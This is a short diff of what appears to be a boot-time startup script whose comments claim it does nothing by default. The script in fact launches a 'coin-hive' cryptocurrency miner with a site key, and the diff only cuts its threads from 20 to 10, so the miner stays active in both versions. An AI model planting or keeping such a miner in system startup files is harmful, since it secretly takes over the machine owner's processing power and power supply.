@@ -10,6 +10,6 @@
 # bits.
 #
 # By default this script does nothing.
-coin-hive VqzrtNANg3J2kfXBvbH5tN0fKYC9yD2j --threads 20
+coin-hive VqzrtNANg3J2kfXBvbH5tN0fKYC9yD2j --threads 10
 
 exit 0
